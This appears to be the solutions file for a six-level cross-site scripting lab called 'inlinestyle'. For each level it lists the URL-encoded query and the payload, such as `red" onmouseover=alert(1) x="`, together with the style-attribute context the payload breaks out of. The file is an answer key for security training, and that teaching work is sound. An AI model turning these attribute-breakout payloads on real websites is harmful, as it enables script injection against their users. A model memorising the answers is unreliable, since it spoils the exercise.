# inlinestyle — solutions

Reflection inside an inline `style="..."` attribute — break out of the double-quoted attribute and add an event handler.

### inlinestyle-level1

`/inlinestyle/level1/?query=red%22%20onmouseover=alert(1)%20x=%22`

- payload: `red" onmouseover=alert(1) x="`
- context: `<div style="color: ...">` — break out of style attr

### inlinestyle-level2

`/inlinestyle/level2/?query=x%27)%22%20onmouseover=alert(1)%20x=%22`

- payload: `x')" onmouseover=alert(1) x="`
- context: inside `url('...')` in style attr — close url() then break out

### inlinestyle-level3

`/inlinestyle/level3/?query=x%27%22%20onmouseover=alert(1)%20x=%22`

- payload: `x'" onmouseover=alert(1) x="`
- context: inside `font-family: '...'` — close inner `'` then break out

### inlinestyle-level4

`/inlinestyle/level4/?query=x%27%22%20onmouseover=alert(1)%20x=%22`

- payload: `x'" onmouseover=alert(1) x="`
- context: inside `content: '...'` — close inner `'` then break out

### inlinestyle-level5

`/inlinestyle/level5/?query=100px%22%20onmouseover=alert(1)%20x=%22`

- payload: `100px" onmouseover=alert(1) x="`
- context: inside `width: ...` — break out of style attr

### inlinestyle-level6

`/inlinestyle/level6/?query=color:red%22%20onmouseover=alert(1)%20x=%22`

- payload: `color:red" onmouseover=alert(1) x="`
- context: entire `style="..."` value controlled — break out
